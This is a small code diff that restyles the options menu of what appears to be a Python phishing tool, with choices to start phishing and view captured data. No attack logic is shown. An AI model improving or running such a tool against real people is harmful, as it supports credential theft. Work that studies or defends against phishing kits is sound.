@@ -51,11 +51,11 @@ def show_banner():
     console.print("[bold red]⚠️  Don’t use this tool for illegal activity.[/bold red]")
     console.print("=" * 60, style="bold magenta")
 
-# Show options menu
+# Show options menu with color styling
 def show_menu():
-    console.print("\n[bold yellow][1][/bold yellow] Start Phishing")
-    console.print("[bold yellow][2][/bold yellow] View Captured Data")
-    console.print("[bold yellow][3][/bold yellow] Exit\n")
+    console.print("\n[bold yellow][1] Start Phishing[/bold yellow]")
+    console.print("[bold yellow][2] View Captured Data[/bold yellow]")
+    console.print("[bold yellow][3] Exit\n[/bold yellow]")
     return input(Fore.CYAN + "Enter your choice: ")
 
 # HTTP Request Handler
